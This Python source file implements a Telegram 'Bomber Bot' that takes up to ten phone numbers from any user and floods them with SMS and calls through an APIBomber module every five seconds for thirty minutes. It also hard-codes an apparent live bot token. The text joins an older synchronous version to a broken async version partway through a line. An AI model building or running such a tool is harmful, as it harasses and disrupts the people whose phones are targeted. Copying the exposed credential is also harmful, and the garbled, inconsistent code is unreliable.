import asyncio
import os
import threading
import logging
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from api_bomber import APIBomber

# ============ CONFIG ============
BOT_TOKEN = "8758206225:AAFihR79UEdrGEJKdaheI-EpSoTQ7n9q7Tw"
ADMIN_ID = 1029883095
PORT = int(os.environ.get("PORT", 5000))

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app
app = Flask(__name__)

# Bot setup
bomber = APIBomber(max_concurrent=10)
user_data = {}
active_attacks = {}

# Global updater
updater = None

# ============ FLASK ROUTES ============
@app.route('/')
@app.route('/health')
def health():
    return jsonify({
        "status": "running", 
        "message": "Bot is active",
        "timestamp": datetime.now().isoformat()
    })

# ============ HELPER FUNCTIONS ============
def clean_number(number):
    number = number.strip()
    if not number.startswith('+'):
        if len(number) == 10 and number.isdigit():
            number = '+91' + number
        else:
            number = '+' + number
    return number

def is_valid_number(number):
    if not number.startswith('+'):
        return False
    digits = number[1:]
    return digits.isdigit() and 10 <= len(digits) <= 15

# ============ TELEGRAM HANDLERS ============
def start(update, context):
    """Start command"""
    keyboard = [
        [InlineKeyboardButton("🔥 Start 30-Min Attack", callback_data="attack")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    update.message.reply_text(
        "🔥 *Bomber Bot Active* 🔥\n\n"
        "Send SMS/Calls to any number\n"
        "30 minutes continuous attack\n\n"
        "Click below to start:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

def button_handler(update, context):
    """Handle button clicks"""
    query = update.callback_query
    query.answer()
    
    if query.data == "attack":
        query.edit_message_text(
            "📞 *Send phone number(s)*\n\n"
            "Example: `9876543210`\n"
            "Multiple: `9876543210, 9876543211`\n\n"
            "Max 10 numbers",
            parse_mode="Markdown"
        )
        user_data[query.from_user.id] = {"state": "number"}
    
    elif query.data == "status":
        user_id = query.from_user.id
        if user_id in active_attacks:
            attack = active_attacks[user_id]
            if not attack.get("stop"):
                remaining = attack["end_time"] - datetime.now()
                minutes = int(remaining.total_seconds() // 60)
                query.edit_message_text(
                    f"📊 *Status*\n\n"
                    f"Batches: {attack.get('count', 0)}\n"
                    f"Time Left: {minutes} min\n"
                    f"Success: {attack.get('success_rate', 0)}%\n\n"
                    f"Use /stop to cancel",
                    parse_mode="Markdown"
                )
                return
        query.edit_message_text("❌ No active attack", parse_mode="Markdown")
    
    elif query.data == "help":
        query.edit_message_text(
            "ℹ️ *Help*\n\n"
            "/start - Main menu\n"
            "/stop - Stop attack\n"
            "/status - Check status\n\n"
            "Number format: 9876543210 or +919876543210",
            parse_mode="Markdown"
        )

def handle_message(update, context):
    """Handle text messages"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_data or user_data[user_id].get("state") != "number":
        update.message.reply_text("Use /start first")
        return
    
    # Parse numbers
    if ',' in text:
        numbers_raw = [n.strip() for n in text.split(',')]
    else:
        numbers_raw = [text]
    
    # Clean and validate
    numbers = []
    for num in numbers_raw:
        cleaned = clean_number(num)
        if is_valid_number(cleaned):
            numbers.append(cleaned)
    
    if not numbers:
        update.message.reply_text("❌ Invalid number! Use: 9876543210")
        return
    
    if len(numbers) > 10:
        update.message.reply_text(f"❌ Max 10 numbers. You sent {len(numbers)}")
        return
    
    # Check existing attack
    if user_id in active_attacks and not active_attacks[user_id].get("stop"):
        update.message.reply_text("⚠️ Active attack exists! Use /stop first")
        return
    
    # Start attack
    end_time = datetime.now() + timedelta(minutes=30)
    active_attacks[user_id] = {
        "numbers": numbers,
        "end_time": end_time,
        "count": 0,
        "stop": False,
        "success_rate": 0
    }
    
    # Schedule attack every 5 seconds
    job = context.job_queue.run_repeating(
        lambda ctx: send_attack(ctx, user_id),
        interval=5,
        first=1
    )
    
    numbers_text = ', '.join(numbers[:3])
    if len(numbers) > 3:
        numbers_text += f' and {len(numbers)-3} more'
    
    update.message.reply_text(
        f"✅ *Attack Started!*\n\n"
        f"Target: {numbers_text}\n"
        f"Duration: 30 minutes\n"
        f"Frequency: Every 5 sec\n\n"
        f"Use /stop to cancel",
        parse_mode="Markdown"
    )
    user_data[user_id] = {}

def send_attack(context, user_id):
    """Send attack batch"""
    if user_id not in active_attacks:
        return
    
    attack = active_attacks[user_id]
    
    if attack.get("stop") or datetime.now() >= attack["end_time"]:
        if user_id in active_attacks:
            try:
                context.bot.send_message(
                    chat_id=user_id,
                    text=f"✅ *Attack Completed!*\n\nTotal: {attack.get('count', 0)} batches\nUse /start again",
                    parse_mode="Markdown"
                )
            except:
                pass
            del active_attacks[user_id]
        return
    
    try:
        # Run async function in sync context
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        results = loop.run_until_complete(bomber.bomb_multiple_numbers(attack["numbers"]))
        loop.close()
        
        # Calculate success
        total_success = 0
        total_apis = 0
        for num, api_results in results.items():
            total_success += sum(1 for r in api_results if r["success"])
            total_apis += len(api_results)
        
        success_rate = (total_success / total_apis * 100) if total_apis > 0 else 0
        attack["count"] += 1
        attack["success_rate"] = int(success_rate)
        
        logger.info(f"Batch #{attack['count']} - Success: {success_rate:.1f}%")
        
    except Exception as e:
        logger.error(f"Attack error: {e}")

def stop_command(update, context):
    """Stop attack"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        attack = active_attacks[user_id]
        attack["stop"] = True
        update.message.reply_text(
            f"🛑 *Stopped*\n\nBatches: {attack.get('count', 0)}\nSuccess: {attack.get('success_rate', 0)}%",
            parse_mode="Markdown"
        )
    else:
        update.message.reply_text("No active attack")

def status_command(update, context):
    """Check status"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        attack = active_attacks[user_id]
        if not attack.get("stop"):
            remaining = attack["end_time"] - datetime.now()
            minutes = int(remaining.total_seconds() // 60)
            update.message.reply_text(
                f"📊 *Status*\n\n"
                f"Batches: {attack.get('count', 0)}\n"
                f"Success: {attack.get('success_rate', 0)}%\n"
                f"Time Left: {minutes} min",
                parse_mode="Markdown"
            )
            return
    update.message.reply_text("No active attack")

def error_handler(update, context):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

# ============ MAIN ============
def run_bot():
    """Run the bot"""
    global updater
    
    try:
        logger.info("Creating bot updater...")
        updater = Updater(BOT_TOKEN, use_context=True)
        
        dp = updater.dispatcher
        
        logger.info("Adding handlers...")
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CommandHandler("stop", stop_command))
        dp.add_handler(CommandHandler("status", status_command))
        dp.add_handler(CallbackQueryHandler(button_handler))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
        dp.add_error_handler(error_handler)
        
        logger.info("Starting bot polling...")
        updater.start_polling()
        
        logger.info("Bot is running!")
        
    except Exception as e:
        logger.error(f"Bot error: {e}")

if __name__ == "__main__":
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Wait for bot to start
    import time
    time.sleep(5)
    
    # Start Flask
    logger.info(f"Starting Flask server on port {PORT}")
    app.run(host="0.0.0.0", port=PORT)        await query.edit_message_text("❌ No active attack", parse_mode="Markdown")
    
    elif query.data == "help":
        await query.edit_message_text(
            "ℹ️ *Help*\n\n"
            "/start - Main menu\n"
            "/stop - Stop attack\n"
            "/status - Check status\n\n"
            "Number format: 9876543210 or +919876543210",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_data or user_data[user_id].get("state") != "number":
        await update.message.reply_text("Use /start first")
        return
    
    # Parse numbers
    if ',' in text:
        numbers_raw = [n.strip() for n in text.split(',')]
    else:
        numbers_raw = [text]
    
    # Clean and validate
    numbers = []
    for num in numbers_raw:
        cleaned = clean_number(num)
        if is_valid_number(cleaned):
            numbers.append(cleaned)
    
    if not numbers:
        await update.message.reply_text("❌ Invalid number! Use: 9876543210")
        return
    
    if len(numbers) > 10:
        await update.message.reply_text(f"❌ Max 10 numbers. You sent {len(numbers)}")
        return
    
    # Check existing attack
    if user_id in active_attacks and not active_attacks[user_id].get("stop"):
        await update.message.reply_text("⚠️ Active attack exists! Use /stop first")
        return
    
    # Start attack
    end_time = datetime.now() + timedelta(minutes=30)
    active_attacks[user_id] = {
        "numbers": numbers,
        "end_time": end_time,
        "count": 0,
        "stop": False,
        "success_rate": 0
    }
    
    # Schedule attack every 5 seconds
    job_queue = context.application.job_queue
    job_queue.run_repeating(
        lambda ctx: asyncio.create_task(send_attack(ctx, user_id)),
        interval=5,
        first=1
    )
    
    numbers_text = ', '.join(numbers[:3])
    if len(numbers) > 3:
        numbers_text += f' and {len(numbers)-3} more'
    
    await update.message.reply_text(
        f"✅ *Attack Started!*\n\n"
        f"Target: {numbers_text}\n"
        f"Duration: 30 minutes\n"
        f"Frequency: Every 5 sec\n\n"
        f"Use /stop to cancel",
        parse_mode="Markdown"
    )
    user_data[user_id] = {}

async def send_attack(context, user_id):
    """Send attack batch"""
    if user_id not in active_attacks:
        return
    
    attack = active_attacks[user_id]
    
    if attack.get("stop") or datetime.now() >= attack["end_time"]:
        if user_id in active_attacks:
            try:
                bot = context.application.bot
                await bot.send_message(
                    chat_id=user_id,
                    text=f"✅ *Attack Completed!*\n\nTotal: {attack.get('count', 0)} batches\nUse /start again",
                    parse_mode="Markdown"
                )
            except:
                pass
            del active_attacks[user_id]
        return
    
    try:
        results = await bomber.bomb_multiple_numbers(attack["numbers"])
        
        # Calculate success
        total_success = 0
        total_apis = 0
        for num, api_results in results.items():
            total_success += sum(1 for r in api_results if r["success"])
            total_apis += len(api_results)
        
        success_rate = (total_success / total_apis * 100) if total_apis > 0 else 0
        attack["count"] += 1
        attack["success_rate"] = int(success_rate)
        
        logger.info(f"Batch #{attack['count']} - {attack['numbers']} - Success: {success_rate:.1f}%")
        
    except Exception as e:
        logger.error(f"Attack error: {e}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop attack"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        attack = active_attacks[user_id]
        attack["stop"] = True
        await update.message.reply_text(
            f"🛑 *Stopped*\n\nBatches: {attack.get('count', 0)}\nSuccess: {attack.get('success_rate', 0)}%",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("No active attack")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check status"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        attack = active_attacks[user_id]
        if not attack.get("stop"):
            remaining = attack["end_time"] - datetime.now()
            minutes = int(remaining.total_seconds() // 60)
            await update.message.reply_text(
                f"📊 *Status*\n\n"
                f"Batches: {attack.get('count', 0)}\n"
                f"Success: {attack.get('success_rate', 0)}%\n"
                f"Time Left: {minutes} min",
                parse_mode="Markdown"
            )
            return
    await update.message.reply_text("No active attack")

# ============ MAIN ============
def run_bot():
    """Run the bot"""
    try:
        logger.info("Creating bot application...")
        application = Application.builder().token(BOT_TOKEN).build()
        
        logger.info("Adding handlers...")
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("stop", stop_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        logger.info("Starting bot polling...")
        application.run_polling()
        
    except Exception as e:
        logger.error(f"Bot error: {e}")

if __name__ == "__main__":
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Wait for bot to start
    import time
    time.sleep(3)
    
    # Start Flask
    logger.info(f"Starting Flask server on port {PORT}")
    app.run(host="0.0.0.0", port=PORT)
